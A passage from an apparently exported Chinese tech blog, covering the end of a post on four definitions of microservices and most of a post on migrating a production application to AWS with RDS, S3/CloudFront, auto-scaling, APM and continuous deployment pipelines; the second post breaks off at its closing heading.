提到了应用程序的分离，他认为一个“微服务”应该完全和另外一个服务实现彻底的隔离，这里当然是指的从开始的代码库就开始隔离了。\n他同样也要求开发人员看到相似性和抽象，并采用单一的领域来指导开发团队的开发。\n因此接下来他继续讨论了领域驱动设计领域驱动设计和康威定律的重要性。他认为界限上下文要足够的清晰，但可以有所重合。如果没有办法做到领域之间很清晰，就通过“物理上的手段”——分离不同的团队来做到这一点。\n这不可避免的带来一些公共代码，但要把这些公共代码作为“库”和“基础设施即代码”来对待，就像你代码中用到的开源软件。并搭建一个 nexus 库来存储那些二进制依赖。\nProvisioned automatically ——“自动初始化”\n自动初始化的要点不在于如何自动化，因为不同的应用不同的平台有不同的初始化方式。这里的重点在于管理分布式应用的复杂性。所以对于每个服务，能够采用声明出这些初始化。例如：服务 A，需要一个 负载均衡，并且可以自动扩展。服务 B，也是同样的声明方式。而这些声明可以用基础设施即代码技术很好的管理起来。\nStatus aware and auto-scaling ——“关注状态和自动扩展”\n在这里，他认为这些应用应该是能够感知吞吐量的监控指标来自我进行扩展的。对于一个现代的应用而言，这是一个基本的架构性要求，但这需要团队有一定的 DevOps 能力。因为这不光要求开发人员能够让应用无状态化，而且要求基础设施可以及时捕获环境的变化。\nThey interact via the uniform interface —— “它们通过统一格式的接口进行交互”\n在这里，James 建议大家采用已经成熟的 HTTP 协议以及标准的媒体类型进行接口交互，而不是采用其它的方式。并且采用 HEATOS 的方式构建 Restful API，使其成为一个超媒体的应用状态引擎。这样就可以将状态和执行过程隔离区分开来，更加容易进行水平扩展。此外，它也构建了一个避免架构孵化的层，可以独立于客户端持续演进。\n在总结的时候，它特意提到了 UNIX 哲学。这引用自Doug McIlroy 的一篇采访：\nEverybody started putting forth the UNIX philosophy. Write programs that do one thing and do it well. Write programs to work together. Write programs that handle text streams, because that is a universal interface.\u0026quot; Those ideas which add up to the tool approach, were there in some unformed way before pipes, but they really came together afterwards. Pipes became the catalyst for this UNIX philosophy. \u0026ldquo;The tool thing has turned out to be actually successful. With pipes, many programs could work together, and they could work together at a distance.\u0026rdquo;\n从这段话里，我们看到了“微服务架构”和 UNIX 哲学之间的关联：\n职责独立：让多个程序（注意是 Programs 不是 Program）做好一件事。 统一接口：文本流是统一的接口，每个程序都可以通过统一的接口进行消费。 公共通信：采用管道（pipe）的方式 可以说，微服务架构本身是对 UNIX 哲学在企业级 Java 应用系统中的另一个案例。可以说，虽然应用场景变了，但 UNIX 分解复杂度的方式和保持简单的理念并未改变。\n最后，James Lewis 把上述六点特征变成了一个六边形的业务能力：\nHexagonal Business capabilities composed of: Micro Services that you can Rewrite rather than maintain and which form A Distributed Bounded Context. Deployed as containerless OS services With standardised application protocols and message semantics Which are auto-scaling and designed for failure\n翻译过来就是：\n微服务你可以通过重写而非维护一个分布式的界限上下文，且作为一个无应用容器的操作系统服务部署。并以标准化的应用协议和消息语义，为失败设计且可自动扩展。\nMartin Fowler \u0026amp; James Lewis 合作版的微服务 9 大特征 #由于在 James Lewis 之后，有很多不同的项目也采用“微服务”作为它们的实践的名称。然而，不同的项目之间还是存在一些差异的，且每个人都按照自己的方式在实践“微服务”。因此，基于“求同存异”的原则，Jame Lewis 的同事 —— 大名鼎鼎的 Martin Fowler 采用一种归纳的方式来解决这个问题：他认为“定义”是一些“共有的特征”(Common characteristics)。Martin Fowler 继续采用了 James Lewis 对这一系列实践的命名，并且做了修改，使之成为一个单独的名词 —— Microservices。\n所以，他将微服务总结为以下9大特征：\n通过服务组件化\n围绕业务能力组织\n是产品不是项目\n智能端点和哑管道\n去中心化治理\n去中心化数据管理\n基础设施自动化\n为失效设计\n演进式设计\n这 9 大特征的中文版具体内容请参考这里，限于篇幅原因，本文不展开讨论。\n我们可以从中看出，Martin Fowler 试图将 James Lewis 的微服务定义进行一般化推广，使其不光之可以在不同的语言架构和技术栈上使用。又可以兼顾敏捷、DevOps 等其它技术，成为一个架构的“最佳实践”集合。但这样一组实践本质上并没有太多的创新，只是把我们本身知道的很多架构和设计的原则结合在当前的技术栈上进行了一次整体的组合和应用。\n恰逢一系列互联网公司的成功事迹带来的新实践（持续交付、DevOps）和新技术（Docker）在经历了早期实践者（Early Adopter）实践积累后的结果井喷后。这样的最佳实践的集中反应固然得到了技术人员的掌声。然而，这样的一种定义对于妄图采用“微服务架构“的人来说是一个很高的门槛。如果这样的 9 个特征的总结是对”微服务架构“的定义。那么，为了要满足以上的 9 个定义，则需要花费很大的精力来进行改造，而且已经超出了技术升级和企业 IT 部门的职责范围。此外，即便我们知道其中每个特征所带来的收益，但却很难拿出案例和数据去佐证满足这 9 个特征的改造收益。\n避开这 9 个特征的概念正交性不谈，即便这 9 个特征可以从既有的结果来回答”什么（What）是微服务“，但却没有给出“为什么（Why）要满足这些特征”和”如何（How）同时满足这些特征”。\n如果自己挖的坑填不了，就教给别人来填吧：\nSam Newman 版微服务的两大特征和 7 个原则 #同样作为 Martin Fowler 的同事，Sam Newman 在其著作 ”Building Microservice“（中文译名为”微服务设计“）的第一章就重新回答了”什么是微服务架构“并回答了”为什么要采用微服务架构“的问题。\nSam Newman 在书中是这么定义微服务的（《微服务设计》的翻译）：\n微服务就是一些协同工作的小而自治的服务。\nSam Newman 自述的微服务的定义更加简单，包含了两个特征：“小” 和 “自治”。\n除了继承 James Lewis 关于微服务应该有多小的描述以外（当然，大小都是基于个人的主观判断），还创造性的用康威定律来约束微服务的大小，即“能否和团队结构相匹配”：如果你的团队维护单个服务很吃力，需要保持团队大小不变的情况下还对维护工作游刃有余，那么这个服务就需要继续被拆分。\n而“自治” 则很谨慎的把 Martin Fowler 微服务定义的 9 大特征中的“去中心化”、“独立” 、”松散耦合“等字眼进行了统一。并进一步解释到“一个微服务就是一个独立的实体”。并且从外部，也就是黑盒的角度来看每个符合\u0026quot;自治\u0026quot;的单个微服务所具有的特征，即：\n可以独立部署。 通过网络通信。 对消费方的透明。 尽可能降低耦合，使其自治。 此外，他还采用了更简单的“黄金法则”来判断期\u0026quot;自治性\u0026quot;。即能否修改一个服务并对其部署，且不影响其他任何服务。如果答案是否定的，说明你的微服务还不够”自治“。\n从 Sam Newman 的定义中，我们可以推导出“微服务”的几个基本事实：\n微服务架构是一个分布式系统架构。 微服务是微服务架构的基本单元。 网络隔离是”必要的“解耦手段。 微服务的业务功能从概念上是完整的，并符合用户角度的“独立”认知。 简而言之，以上的两个特征的表述主要是将微服务从逻辑架构上和部署架构上都看作是一个正交的原子功能单元。而要做到这一点，则需要而要把整个应用系统正确的建模到这个层次，则需要参考很多的内部外部因素。\n此外，为了达到“小”和“自治”的目的，Sam Newman 还总结了 7 条原则用来在实施的时候和具体实践结合，分别是：\n围绕业务概念建模 接受自动化文化 隐藏内部实现细节 让一切都去中心化 可独立部署 隔离失败 高度可观察 可以看出，Sam Newman 把 Martin Fowler 的 9 大特征用更加具体的术语来重新描述，并且从逻辑上处理了 Martin Fowler 微服务 9 大特征中概念重复和不明确的部分，使其更简单和明确并且更加可操作。例如把“去中心化的数据管理” 和 \u0026ldquo;去中心化治理\u0026quot;合并为“让一切都去中心化”等。\n更重要的是，Sam Newman 提出了采用微服务技术的主要好处，告诉了我们“为什么要用微服务”：\n技术异构性：采用更合适的技术栈灵活的处理局部问题。 弹性：这里的“弹性”是弹性工程学的概念，指的是局部失败会被隔离，使得整体不会失败。 扩展：可以根据系统的部分组件按需扩展。 简化部署：这里简化部署不是指的是部署的拓扑结构，而是通过持续的小批量、小范围的部署来降低整体失败的风险。 与组织结构相匹配：微服务架构可以让组织的团队转化为合适的大小，并采用透明的制度来进行规范和复制。避免团队的人数增长而带来更多的管理层，使组织熵的上涨。 可组合性：由于各个微服务间不存在依赖关系，所以可以根据用户界面的情况进行灵活的调整和复用，避免对单体应用进行整体的大规模调整。 对可替代性的优化：由于风险和领域更加独立和隔离。因此，抛弃一个微服务并重写的成本并就变的十分低廉。 Chris Richardson 的“微服务架构模式” #2017 年，Chris Richardson 使用 Microservices.io 域名开始推广自己的微服务理念。他是这样定义微服务的：\nMicroservices - also known as the microservice architecture - is an architectural style that structures an application as a collection of loosely coupled services, which implement business capabilities. The microservice architecture enables the continuous delivery/deployment of large, complex applications. It also enables an organization to evolve its technology stack.\n中文翻译过来，大意如下：\n微服务，也就是微服务架构。是一种用于把一个应用程序结构化为一个实现业务功能的松散耦合的服务集合的架构风格。\n微服务架构使得在大型、复杂的应用程序中实现持续交付和持续部署成为可能。它使得组织可以演进自己的技术栈。\n在 Chris Richardson 采用了较为简单的架构定义和准确的目标定义相结合的方式来定义”微服务架构“：它一方面简单的把微服务架构定义成一个实现业务功能的松散耦合的服务集合，另一方面又以十分具体的目标和结果（持续交付/持续集成）来约束这样一个松散耦合系统的效果：组织可以演进自己的技术栈。\nChris Richardson 将“单体架构”和“微服务架构”看做两种架构模式。并且在同样的上下文中对二者各自的优劣进行了比较。更加重要的是，Chris Richardson 采用 AFK 扩展立方来拆分微服务从而回答了“如何做微服务”的问题。\n值得注意的是，Chris Richardson 所采用的例子虽然在同样的上下文中，但由于特征不同并不具备可比较性。因此，他采用了在”单体架构模式“（Pattern: Monolithic Architecture）的基础上描述其局限性的方法引出了”微服务架构模式“（Pattern: Microservice Architecture）。严格的说，Chris Richardson 的“单体架构模式“是一种对现状的和举例，并没有给出其特征和方法的描述，因此不能称之为模式。而”微服务架构模式“则又是一系列模式的总和，如下图所示：\n从这个角度看，Chris Richardson 的这些模式并没有突破 Sam Newman 在《微服务设计》中总结出的实践。但相较于我们所知道的微服务的优点。Chris Richardson 也列出了微服务的缺点：\n开发者必须应对创建分布式系统所产生的额外的复杂因素。 现有开发者工具/IDE主要面向单体应用程序，因此无法显式支持分布式应用的开发。 测试工作更加困难。 开发者必须采取服务间通信机制。 很难在不使用分布式事务机制的情况下跨服务实现功能。 跨服务实现功能要求各团队进行密切协作。 部署复杂。在生产环境下，对这类多种服务类型构建而成的系统进行部署与管理十分困难。 内存占用量更高。微服务架构使用N*M个服务实例替代N个单体应用实例，如果每项服务运行自己的JVM（或者其它类似机制），且各实例之间需要进行隔离，那将导致M倍JVM运行时的额外开销。另外，如果每项服务都在自己的虚拟机（例如 EC2 实例）上运行，如同Netflix一样，那么额外开销会更高。 相较于之前的微服务定义而言， Chris Richardson 的微服务体系比较完整，而不仅仅是总结和列举实践。Chris Richardson 的\u0026quot;微服务架构模式\u0026quot;不光回答了“什么是（What）微服务”，也回答了“为什么（Why）要用微服务”，“什么时候（When）用微服务”，“什么场景（Where）下”以及“如何（How）实现微服务”的问题。\nChris Richardson 还编写了一套微服务的指南，可以在这里 查看。\n比”什么是微服务“更重要的事 #本文总结了微服务常见的 4 个定义。但比这些定义更重要的是你为什么要用微服务？你想从微服务中获得什么益处？你是否了解为了追求这些益处所带来的代价？如果不先明确这些问题，在不理解微服务架构或者技术所带来的的风险和成本。盲目的采用所谓的微服务，可能带来的结果并不理想。\n不过，在讨论这些问题之前，坐下来统一一下对微服务的理解，会提升我们讨论和实践微服务的效率。\n","date":"September 14, 2018","permalink":"/blog/2018/2018-09-14-four-definitions-of-microservices/","section":"Blogs","summary":"","title":"讨论微服务之前，你知道微服务的 4 个定义吗？"},{"content":"本文是我在 gitchat 上的文章云计算生产环境架构性能调优和迁移套路总结（以 AWS 为例）的后半部分，本文对原文有所修改和总结。交流实录请点击这里。\n在 AWS 上的生产环境性能分析案例一文中，记录了我对客户应用生产环境的一次性能分析。接下来，我们要根据所发现的性能问题进行架构优化，以提升可用性和性能。同时，这篇文章也总结了应用迁移到云上的套路。\n设计云计算平台迁移计划和方案 #将应用程序迁移到云计算平台上主要的目的是把自行构建的高风险高成本应用以及组件替换为云计算平台上的高可靠性低成本组件/服务。\n应用架构的迁移有两种方案：\n一种是整体一次性迁移，即重新实现一个架构并完成部署，然后通过金丝雀发布或者蓝绿发布切换。这种方式的好处\u0010是简单，直接，有效，一开始就能按照最佳实践构建应用架构。而且对于现有系统来说影响不大。但如果方案没设计好，容易造成高级别的风险，所以应当进行大量的测试以确保可靠性。\n另一种是持续部分迁移，每次引入一点风险，保证风险可控，但缺点就是优化步骤较多。虽然持续部分迁移步骤多，但是总体时间并不一定会比整体迁移更高。\n**注意：**由于自动化基础设施和架构设计会带来一些副作用，特别是配置间的耦合。因此，对于生产环境的直接优化要慎用自动化。如果一定要用，请务必在测试环境上做好测试。但如果你能做到自动化并且有完好的测试，不如直接做整体一次性迁移方案得了。\n一般说来，一个完整的云平台迁移方案会分为以下三大阶段：\n第一阶段：构建高可用架构以实施水平扩展，从而保证了应用的稳定运行。\n第二阶段：引入 APM 并根据 APM 数据进行定向优化，采用云计算的服务来优化应用的资源使用。\n第三阶段：构建应用端的持续部署，构建 DevOps 的工作模式。\n这三个阶段是大的顺序，而每个大的阶段里又会相互掺杂一些其它阶段的内容。但无论什么样的迁移方案，一定要通过度量进行风险/收益比排序，最先完成代价最小，收益最大的内容。\n第一阶段：构建高可用架构 #我们之前说过，一个应用架构的第一追求就是业务的连续性和抗风险能力。一个高可用的架构能够在你的应用面对压力的时候从容不迫。因为如果资源满负荷运转，新的请求会因为没有可用资源而导致排队。这是常见的停机或者性能降低的原因。这就是 AFK 扩展矩阵常说的 X 轴扩展：通过复制自己扩展资源从而达到降低排队等待的时间。此外，水平扩展出来的机器同样也是一个预留资源，能够提高应用的可用性。应用架构不仅仅是应用程序的事情，也包含着资源的分配，二者是相辅相成的。\n一般会经历如下几步：\n第一步，有状态和无状态分离 第二步，牲畜化（Cattlize）应用实例 第三步，自动化水平扩展（AutoScaling） 第一步：有状态和无状态分离 #先回顾一下当前应用的架构 ： 状态分离的目标是把有状态的组件和无状态的组件分开，以便在做复制的时候降低不一致性。最简单的判定办法是：如果复制当前的虚拟资源，并通过负载均衡随机分配请求访问，哪些部分会造成不一致。\n常见的有状态内容比如数据库，上传的文件。所以，我们要把它们独立出来。在“萨瓦迪卡”的例子中，我们首先把数据库独立了出来。如下图所示：\n在这个过程中，我们采用 RDS 而不是另外一个 EC2 上构建一套 MySQL 来完成数据库的分离。最主要的原因就是 RDS 提供了更好的可用性和数据库维护支持，例如自动备份，更多的监控指标，更自动的数据库迁移和维护窗口等。我们采用 Aurora 引擎的 MySQL 模式，这可以将数据库做成一个集群并让另外一个只读分片，降低数据库的负担。\n在分离数据库的时候，要注意以下几点：\n数据库分离的性能基线就是在同样的负载测试下，不能够比没分离之前更差。 数据库的网络建立在一个私有的子网中，除了应用子网内的 IP 不能访问数据库，从而提高安全性。 构建一个私有域名来访问数据库，这样可以固定应用的内部配置，减少对配置的修改。同时也给外部切换数据库主备等留下了更灵活的空间。 注意对原有数据库 MySQL 配置信息的复制，这会导致很大程度上的性能差异。 对于数据较大的数据库启动而言，会有一个几分钟的热身（Warm up）时间，这会导致性能下降。所以，做切换的时候提前启动数据库以做好准备。 不要用默认的 root 账户作为应用的访问账户。 由于 RDS 可以在不影响数据完整性和一致性的情况下降低使用配置，在最开始的时候采用较高的配置。随着优化的不断进行，可以采用维护时间窗口（Maintenance Time Window）在低流量时段对 RDS 实例的配置进行降级，以节约成本。 完成了数据库的隔离，我们就可以依法炮制文件的隔离了。最简单有效的方案是把文件存储在对象存储服务中。AWS S3 就是这样一种服务。避免自己构建共享文件系统或者共享存储设备。\n文件相较于数据库来说，占用的内存资源和 CPU 资源较少，大部分的处理为 IO 处理，只要网络和设备的 IOPS 足够。一般不会出现大的问题。\n为了降低文件隔离带来的问题，在迁移文件的时候尽量保证文件目录结构不变，只改变文件访问根（root）的位置。对于文件来说，可以通过多种方式：\n如果有对应的文件存储位置修改功能，可以通过修改全局文件存储位置实现。 如果有反向代理，可以通过修改反向代理的配置来通过重定向实现。 对时间敏感的文件读写，可以根据日期和时间建立文件夹。 如果有七层的负载均衡或者 CDN 可以通过路径匹配来实现、 在“萨瓦迪卡”的例子里，我们通过 CDN 来实现了文件的隔离。将文件存储在 AWS S3 上，并且用 CloudFront 作为 CDN。用路径匹配的形式让请求通过访问 S3 而不是虚拟机实例来降低虚拟机的 IO 请求，再加上 CDN 的缓存，这就可以大大减少虚拟机实例的负担，也提升了用户的体验。最终的架构如下图所示：\n在采用 CDN 的时候请注意以下几点：\n最开始的时候取消默认缓存设置。因为对于未知的应用来说，各个访问点的内容更新频率并不清楚。这个阶段主要是为了收集应用的访问数据。 灵活利用缓存的**过期时间(Expire time)和强制过期(Invalidate)**功能，来控制新旧内容的读写。 注意 DNS 的 TTL 时间，并可以通过设置多级域名和 Failover 功能进行 0 停机切换或者蓝绿部署。例如当前总入口域名直接访问 ELB，可以增加一个 Failover 备份访问点访问 CDN，然后通过 CDN 访问 ELB。如果没有特别的 WAF 配置。 出问题了多检查 HTTP 请求头和响应头的信息，一般都内藏玄机。 完成了应用的状态隔离，我们就可以开始进行水平扩展了。\n第二步：牲畜化（Cattlize）应用实例 #在“萨瓦迪卡”的例子里，它的整个架构就是一个宠物式（Pets）的架构：独一无二不可复制。但是带来的问题就是当宠物式架构出了问题之后，没有相对应的替代方案。而牲畜式（Cattles）的架构，就是可以进行复制的容错架构，其中任何一个出问题了，都有相应的备胎（alternatives），正所谓“有备无患”。\n所以，可以认为，高可用架构的本质就是把宠物变成牲畜的问题。\n如果你的应用是以函数式的方式进行编写的，那么它本身就自带水平扩展功能。函数本身是没有状态的，它只是对数据的加工。这样的应用仅仅是把用户手上的数据，经过一系列的转化，存储在了服务端。\n如果你的应用不是以函数式的方式进行编写的，你也不想修改应用，除了做状态隔离以外，你需要将应用程序实例转变为可复制的模式：\n首先，你最好有一个备份的网络可用域。可以理解为两个机房，当一个机房出问题了，你还有另外一个机房。\n其次，你要通过虚拟机镜像来对应用实例进行复制。\n最后，你要采取蓝绿部署或者金丝雀发布的形式来控制用户的访问以达到0停机的目的。\n所以，我们在“萨瓦迪卡”上做了如下的规划：\n构建另外一个可用区的网络。 通过虚拟机镜像复制虚拟机实例。 通过负载均衡来分配应用的访问。 通过 RDS 集群节点做统一的访问入口，负载均衡和高可用由 RDS 自己管理。 于是，我们就形成了如下图所示的最终方案：\n特别需要注意的是，在构建虚拟机镜像的时候，你需要对虚拟机的操作系统进行升级并安装 APM 代理程序（APM agent），在升级的时候，为了避免不必要的停机时间，我们采用了如下流程：\n构建一个当前虚拟机的镜像。 采用新镜像启动一个虚拟机实例，这个实例的配置需要和现有虚拟机实例一致。 新的虚拟机实例启动后并不加入到负载均衡里。 在新启动的虚拟机实例一台上进行更新和升级。 把升级后的虚拟机加到负载均衡里。 检查新加入负载均衡的虚拟机正常工作后，在线升级老的虚拟机。 完成之后，构建新的虚拟机镜像，并作为可复制镜像。 完成了以上的步骤之后，我们就不需要晚上在低访问量的时候进行操作了，白天可以通过创建新的虚拟机实例来完成相应的测试，并通过移入移出负载均衡的方式进行发布。\n接下来，就要让这个架构可自动化伸缩了。\n第三步，自动化水平扩展（AutoScaling） #当我们完成了前面两步，可以基本认为满足了高可用的条件。但是，由于是静态的人为操作，仍然需要人工值守来解决突发状况，这显然不是一个长久之计，我们要使架构可以处理突发状况，这也是云计算平台的优势所在。\n首先，我们需要规划冗余资源。\n冗余值是为了应对超过过去峰值的资源使用率，而设计的容量，它是最大值减去保留使用率（Reserve Utilization）所剩下的值。以我的经验，在没有特别事件出现的情况下。保留使用率一般取均值的 3 倍，或者峰值的 2 倍 中较高的那个值。举个例子：如果我的内存使用平均值在 2 GiB，峰值在 4 GiB。那么我的保留使用率是 8 GiB。\n冗余值的目的不是为了应对突发状况，而是给突发状况保留一些相应时间。当应用有趋于不正常的趋势的时候，我们可以由足够的时间来为下一个特殊阶段进行处理。\n然后，构造监控告警。\n我们也可以用以上几个值来设置资源监控告警来通知我们，告警方案一般为“两线三区”：两线分别为告警线和人工干预线，三区分别为：绿区（正常），黄线（警告），红线（严重）。而每个线的设计方法也不同，一般有以下几种：\n按照最大资源的 60% 和 80% 设计告警线和人工干预线。60%以下为绿区，60%-80% 为黄区，80% 以上为红区。剩下的为冗余。 按照边际值的增幅的平方和立方设计告警线和人工干预线。边际值平方以下增速为绿区，边际值立方以下，平方以上为黄区，边际值立方以上为红区。 按照资源使用均值的 3 倍，或者峰值的 2 倍的较低值和较高值设计告警线和人工干预线。 在“萨瓦迪卡”里，我们采用了第一种方式进行了设置。因为这个应用并不会有突发的访问状况，所以我们采用了均值。\n最后，制定和测试自动伸缩策略。\n有了以上的数据之后，我们就可以制定自动伸缩策略了。一般是在监控处于“黄区”的时候开始出发自动伸缩策略。而由于自动伸缩会有一定的“热身时间”（Warm-up Time），这个时间如果资源被用完，就会导致宕机。所以，我们需要更快的响应。因此，制定自动伸缩策略的时候要采用“快增慢减”原则：即以两倍到三倍的速度增加以满足资源消耗，并以但倍速的方式进行减少，不怕浪费，就怕影响用户感知。\n此外，请一定要通过前面所讲的性能测试方案来测试自动伸缩策略，以确保策略是可用的。我以前碰到过一个例子：客户想当然的制定了自动伸缩策略，但从未测试过。导致了一次自动伸缩失效而引起的停机。\n这个时候，应用迁移到云上的第一步工作就完成了。我们通过使用云计算平台的可靠性特性，首先先保证了应用的稳定运行。接下来，我们要用云计算平台的优势来逐步优化云平台上的应用。\n第二阶段：引入 APM 并根据 APM 数据进行定向优化 #对于一个黑盒应用，我们需要了解应用的内部性能状况，除了自己编写相应的代码以外，就是用 APM 平台了。APM 平台往往会提供一个低侵入的方案来获取应用和操作系统的性能数据。一般会采用代理（Agent）的形式运行，并且通过网络对外传输数据，某种意义上说这是一种不安全的方式，但现代大多数 APM 工具都提供了加密的方式来传输和压缩数据。NewRelic 就是这个行业的佼佼者，它不光提供了低入侵的方案，还提供了更多的分析界面来帮助我们找到应用的性能问题。效果如下所示：\n在“萨瓦迪卡”里，我们就用了 NewRelic 来作为 APM 方案，它帮我们发现并度量了很多问题，例如缓慢的查询，低性能的插件，不稳定的资源使用等。无论是应用本身还是架构上的问题，以指导我们更好的进行性能调优，并通过数据的对比来判断效果。此外，我们可以结合 CDN 的统计数据来看哪些 URL 和资源最常被访问，从而制定出更有效的性能优化手段。\n而一般的性能优化，会采用以下四种基本的方式。但无论是哪一作用方式，一定要根据业务数据来设计缓存，要了解对应访问点的数据更新频率和性能要求。\n增加缓存 #缓存往往是提升性能的第一选择，主要原理是采用少量速度更高且较贵的资源替代部分速度较慢的资源，形成“短路访问”：本来需要经过四个环节才能获取的数据通过两个环节就可以获取到了。而缓存一般是根据 LRU 算法（Least Recently Used，即最近最久未使用）来实现的。\nCDN 可以被看做是一种缓存，它通过网络延迟和路由帮用户找到访问更加快速的边缘服务器来加速。边缘服务器上往往根据 LRU 算法存储了 源服务器（Origin Server）的一部分拷贝。\n另外一种就是内存数据库或者 Key-Value 存储，例如 Redis 或者 Memory Cache 这种方案是把数据通过一定的格式索引（最简单的方式就是 HashMap）并存储到内存里来替代访问。然而，这些服务的能力有限，并不能提供太多的复杂的操作。\n动静分离 #由于 Web 应用大多是读写，而不同的设备和内容的访问速度是不同的。对于低写入，高读取的资源。我们可以把它静态化。例如 Hexo 和 Jekyll 这样的工具，就可以把 Markdown 生成静态的 HTML 文件。然后通过 S3 或者反向代理为用户提供内容。相较于 Wordpress 或者很多动态应用，这样的内容不会占用 CPU 和内存，仅仅占用文件系统 IO。占用资源低，也较少会出错。此外，静态的内容也更容易被缓存。\n唯一的问题就是区分应用架构中的静态部分和动态部分，并通过版本控制来对内容进行管理。必要的时候要采用 缓存的失效时间或者 HTTP 头的缓存控制来进行更新。\n读写分离 #如果把应用程序看成一个大的 I/O 系统或者 读/写系统。我们要明白数据是如何写入并如何读出的，特别是针对于数据库而言， 某些的操作都会带来一定的锁或者事务来解决临界资源的互斥访问问题，这种操作一定程度上也会影响性能。所以，我们如果能把数据库的读写分开，会提升应用的部分访问性能。\n例如在 AWS 中，Aurora 数据引擎可以为数据库创建集群和只读分片来做读写分离。\n另外一种情况下就是用搜索引擎（例如 ElasticSearch）来替代数据库查询，性能会高很多。只是要注意数据的更新频率和索引时间。\n异步访问 #在大型企业级应用中，通常会应用事务（Transaction）保证业务的完整性和一致性，代价则是系统资源的事务内占用。如果有很多的事务占用着资源，则会造成时间上的资源使用浪费。更加现代的做法是把一个较长的事务拆分成多个较短的事务，通过异步的方式进行“两步提交”来保证最终一致性。优点是释放了很多资源，缺点则是需要更多的确认操作来保证最终一致性。\n通过以上的四种方式，我们还可以为不同业务组合成不同的分离方案。并通过 AFK 扩展三角的 Y 轴按能力将应用的关注点进行拆分，采用不同的技术栈和服务来实现并优化性能。例如变成微服务的架构的应用。或者当数据库达到瓶颈之后通过 Z 轴进行拆表拆库在分摊数据库的负载的情况下保证一致性。\n第三阶段：构建应用端的持续部署 #以上只是进行了基础设施方面的改造，应用的性能和稳定性得到了一定程度提升。然而，我们仍然采用部分人工的操作来进行应用和基础设施的变更。以“萨瓦迪卡”为例，如果我们需要更新应用，为了减少停机时间，则需要执行下面的步骤：\n为当前生产环境虚拟机创建镜像。 采用新创建的新镜像创建虚拟机。 在新创建的虚拟机上进行更新。 更新后进行测试，测试完毕后创建新的更新镜像。 采用更新后的镜像进行自动水平扩展。 替换负载均衡里的新老虚拟机。 终止已经下线的虚拟机实例。 然而，这些操作会带来人为因素的风险，可能会带来一些数据丢失的情况。而且，浪费了人工去做云计算环境的部署，前后时间可长达 4 个小时。\n通过之前的两个阶段，我们已经把一个非分布式的应用变成了简单的分布式应用。而面对分布式应用的架构复杂性，人力处理肯定是低效的。我们需要采用自动化的方式完成应用生命周期和基础设施生命周期的完整管理。持续部署流水线就是这样一种实践，通过把流程固化成自动化的脚本和操作避免了人工干预的风险，从而构建出了一个发布软件的可靠流程。\n在实践中，我们往往采用持续集成服务器（例如 Jenkins），搭配云计算平台的资源描述和编排服务（例如 CloudFormation）和一些脚本和模板管理工具来完成这一系列操作。在这之前，我们需要对应用程序的不同部分进行封装。\n通过“三段封装”来规划应用结构 #第一段：基础设施封装 #通过基础设施即代码技术构建出一个应用程序的平台，这个平台可以做到隔离应用且对开发者透明。例如：Kubernetes 或者 AWS CloudFormation。前者可以为开发者提供一个简单的应用部署平台，并很好的支持了很多高可用的特性。后者可以用来配置包括网络在内的所有 AWS 资源。\n这里需要注意的是要根据基础设施的变更频率对基础设施实施分层管理，将经常变动的部分独立成一个风险最小的变更单元，避免和其它部分相互影响。\n第二段：应用封装 #通过构建持续交付流水线构建出应用镜像或者虚拟机镜像，要做到快速复制以实现水平扩展。例如 Docker 镜像或者用 Packer 构建出 AMI。\n这里需要注意的是构建镜像的时候一定要考虑无状态特性，每个镜像被创建后所展现出来的最终效果和操作都是幂等的。\n第三段：数据封装 #通过数据全量+增量的备份把数据库或者文件存储在更稳妥的地方，并修改访问方式。例如：采用 S3 或者 RDS 来存储。\n这里需要注意的是如果你没有用 RDS 等高可靠的数据存储服务，就要要定时对数据进行备份恢复测试，避免需要恢复数据的时候备份不起作用。备份策略可以按照全量 + 增量的方式进行，具体的方式可以参考不同数据库的方案。\n完成了三段封装后，我们需要为其构造一个可靠的生命周期管理流程：构建持续部署流水线。\n构建持续部署流水线 #首先，要把上述的内容纳入版本控制。二进制的内容就进行版本编号存储，且不可修改和删除，只能新增。\n持续集成服务器本质上是一个自动化的任务调度和执行管理程序，它包含两个部分：任务调度和任务执行。\n而任务调度包含主动和被动两个模式：\n主动模式：通过定时机制进行扫描，当发现有变动之后触发任务的执行。\n被动模式：通过类似于 web-hook 被动任务触发，或者由上一个任务进行触发。\n任务执行则需要做到幂等性和线程隔离，确保每次的执行环境和结果都一致。我们可以用一个任务的执行结果成为下一个执行的输出。这样，我们通过主动扫描代码改动或者提交任务触发的方式，把测试，构建和打包的工作串联起来，就构成了一条持续交付流水线。大概会经历以下几个步骤：\n代码提交 运行自动化功能测试和静态检查 构建 部署至测试环境 运行自动化验收测试 发布 在以上的步骤里，除了第一步和最后一步，所有的中间步骤都是要自动化的。\n这里需要注意的是：我们需要把部署和发布解耦。发布（Release）和 部署（Deploy）是两个不同但又相关的动作，发布是一个业务操作，表示用户可以接触到最新版的应用系统。 而部署是一个技术操作，表示应用运行在某一环境上。\nJenkins 里，我们可以采用 Job（任务）的方式来执行任务，由代码库触发测试，测试完成后触发构建、部署和发布。\n为了减少系统的停机时间，我们也需要使用一些零停机部署策略，例如”蓝绿部署“和”金丝雀发布“。\n蓝绿部署 #蓝绿部署的做法是同时生成两个相同的生产环境版本，一个叫做”蓝环境“，一个叫做”绿环境“。用户当前只能访问其中一个环境，让另外一个环境进行部署。待到部署完成并通过检查之后，再切换至部署好的环境。如果部署失败，则把用户流量切换到原先的环境就算是做到了快速回滚。某些云计算平台内置 了这样的部署策略，可以帮助快速做到这一点。我们也可以通过更新内部 DNS 记录或者 Nginx 配置做到这一点。如果你的变更中包含数据库变更，则需要额外的数据库迁移策略和切换策略，也会花费额外的时间。\n金丝雀发布 #金丝雀发布可以看做是 蓝绿发布的一种演变形式，相比蓝绿发布来说更加灵活。我们可以通过路由权重让一小部分用户尝试新的版本。就像是在煤矿坑道里的金丝雀那样，很快就能发现生产中的问题，并限制问题的影响范围。\n我们还可以基于此做 A/B 测试来度量更新的使用率。但这需要你的基础设施支持“带权流量分配”和“ Session 持久化”。前者是为了更灵活的切分流量，后者则是避免同一个用户访问不同版本应用带来的不一致性。\n基础设施变更流水线 #上述描述的是应用程序的生命周期，我们还需要构造基础设施的生命周期。我们也可以如法炮制同样的流水线来进行基础设施变更。这样我们就可以避免人工调整基础设施带来的各种隐患。我们需要把不同的备份方案和测试方案增加进去以确保我们的基础设施的稳定性和反脆弱性，很多工具可能需要我们自己来编写。\n这里需要注意的是一定要尽可能避免人工干预生产环境带来的风险，尽可能通过流水线来对基础设施进行变更。\n最后 